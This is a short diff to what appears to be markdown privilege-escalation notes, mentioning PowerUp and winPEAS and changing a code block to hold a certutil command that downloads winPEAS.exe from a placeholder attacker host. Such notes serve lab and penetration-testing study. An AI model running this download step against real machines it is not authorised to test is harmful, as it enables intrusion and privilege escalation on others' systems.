@@ -10,8 +10,8 @@ First I like installing a `powerup` *AND* `winPEAS`. Using these tools will help
 
 winPEAS is great to find some loot and privesc. Make sure to read fine print.
 
-```bash
-- certutil -urlcache -split -f http://<attacker-ip>/winPEAS.exe winPEAS.exe
+```cmd
+certutil -urlcache -split -f http://<attacker-ip>/winPEAS.exe winPEAS.exe
 ```
 
 ### PowerUP
